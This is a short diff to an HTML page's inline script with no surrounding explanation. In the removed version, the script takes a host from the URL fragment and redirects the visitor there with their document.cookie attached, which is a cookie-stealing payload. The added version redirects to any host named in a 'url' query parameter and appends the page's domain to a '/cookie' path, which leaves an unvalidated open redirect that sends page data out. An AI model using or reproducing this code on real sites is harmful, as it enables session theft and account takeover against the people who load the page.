@@ -3,8 +3,14 @@
 <head>
   <title></title>
   <script>
-    let hashValue = window.location.hash.substring(1);
-    document.location = hashValue+"/cookie?cookie="+document.cookie;
+    // Get query parameters from URL
+    const urlParams = new URLSearchParams(window.location.search);
+    // Get the 'url' parameter
+    let paramValue = urlParams.get('url');
+    // Construct and redirect to the new URL with cookie
+    if (paramValue) {
+      document.location = paramValue + "/cookie?cookie=" + document.domain;
+    }
   </script>
 </head>
 <body>
